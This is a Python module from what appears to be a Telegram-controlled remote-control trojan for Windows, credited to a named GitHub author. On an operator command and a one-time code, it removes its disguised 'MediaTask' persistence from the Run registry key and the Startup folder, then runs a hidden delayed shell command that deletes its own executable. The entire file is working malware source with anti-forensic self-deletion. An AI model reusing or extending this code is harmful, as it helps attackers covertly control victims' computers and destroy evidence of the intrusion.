##  _________________________________________
##   |_______  authors: Eks1azy  _______| 
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\                    
##  ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy   / /
##  |                                        / / 
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/


from aiogram import types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from config import ALLOWED_USER_ID
import sys, subprocess, time
import os, winreg
from lib.states import self_destruction
import random
from lib.texts import TEXTS, user_languages

password = ''.join(random.choice('0123456789') for _ in range(8))

def register_self_destruction(dp):
    @dp.message(F.text.lower() == "самоуничтожение")
    @dp.message(F.text.lower() == "self-destruction")
    @dp.message(Command("self_destruction"))
    async def start_self_destruction(message: types.Message, state: FSMContext):
        user_id = message.from_user.id
        lang = user_languages.get(user_id, 'en')

        if user_id == ALLOWED_USER_ID:
            await message.answer(TEXTS[lang]["self_confirm_prompt"].format(password=password))
            await state.set_state(self_destruction.waiting_code)
        else:
            await message.answer(TEXTS[lang]["self_no_access"])

    @dp.message(self_destruction.waiting_code)
    async def process_self_destruction(message: types.Message, state: FSMContext):
        user_id = message.from_user.id
        lang = user_languages.get(user_id, 'en')

        if user_id != ALLOWED_USER_ID:
            await message.answer(TEXTS[lang]["self_no_access"])
            return

        code = message.text
        if code == password:
            await message.answer(TEXTS[lang]["self_success"])

            def remove_from_autorun(program_name):
                startup_folder = os.path.join(
                    os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
                )
                program_path = os.path.join(startup_folder, program_name + '.lnk')
                try:
                    reg_key = winreg.OpenKey(
                        winreg.HKEY_CURRENT_USER,
                        r"Software\Microsoft\Windows\CurrentVersion\Run",
                        0, winreg.KEY_SET_VALUE
                    )
                    try:
                        winreg.DeleteValue(reg_key, program_name)
                    except FileNotFoundError:
                        pass
                    winreg.CloseKey(reg_key)
                    if os.path.isfile(program_path):
                        os.remove(program_path)
                except Exception:
                    pass

            remove_from_autorun("MediaTask")

            def self_destruct():
                exe_path = sys.executable
                delete_command = f'del "{exe_path}"'
                subprocess.Popen(
                    f'ping localhost -n 6 > nul && {delete_command}',
                    shell=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )

            time.sleep(1)
            self_destruct()
            sys.exit()
        else:
            await message.answer(TEXTS[lang]["self_wrong_code"])
            await state.clear()